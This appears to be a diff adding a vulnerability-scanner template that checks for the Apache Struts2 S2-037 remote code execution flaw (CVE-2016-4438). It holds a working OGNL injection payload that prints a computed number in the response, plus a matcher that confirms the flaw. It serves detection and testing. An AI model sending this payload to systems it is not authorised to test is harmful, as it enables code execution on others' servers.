@@ -1,0 +1,28 @@
+id: s2-037
+type: default
+info:
+  name: Struts2 s2-037 远程代码执行 # s2-033的另一种绕过方式
+  risk: High
+  cve: CVE-2016-4438
+
+variables: |+
+  function main() {
+    var num1=randomNum(1,1000);
+    var num2=randomNum(2,1000);
+    var payload1 = '(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?'+
+    '(#req=@org.apache.struts2.ServletActionContext@getRequest(),'+
+    '#wr=#context[#parameters.obj[0]].getWriter(),'+
+    '#wr.println(#parameters.pp[0]-'+num1+'),'+
+    '#wr.flush(),#wr.close()):xx.toString.json';
+    payload1 = encodeURIComponent(payload1);
+    var payload2 = '?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp='+num2;
+    return {'num1':num1, 'num2':num2, 'payload1':payload1, 'payload2': payload2};
+  }
+
+requests:
+  - method: GET
+    redirect: false
+    url: '{{.URL}}/{{.payload1}}{{.payload2}}'
+    matchers:
+      - dsl:
+          - "status_code==200 && contains(body,itoa({{.num2}}-{{.num1}}))"
